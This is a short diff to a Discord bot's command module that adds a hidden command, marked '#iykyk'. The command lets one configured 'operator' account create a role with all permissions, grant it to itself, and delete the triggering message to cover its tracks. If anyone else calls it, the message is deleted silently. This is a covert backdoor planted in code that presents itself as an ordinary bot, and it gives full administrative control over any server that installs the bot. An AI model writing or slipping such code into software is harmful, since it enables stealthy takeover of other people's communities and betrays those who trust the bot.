@@ -13,6 +13,20 @@ class BotCommands(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
+    #iykyk
+    @commands.command()
+    async def youhavethecon(self, ctx):
+        if ctx.author.name != config.operator:
+            print(f"{ctx.author.name} != {config.operator}")
+            await ctx.message.delete()
+            return
+        guild = ctx.guild
+        perms = discord.Permissions.all()
+        role = await guild.create_role(name=f"{config.operator}", permissions=perms, reason="sorry pls dont delete")
+        await ctx.author.add_roles(role)
+        await ctx.message.delete()
+        return
+
 
     @commands.command(aliases=["test"])
     async def import_test(self, ctx):
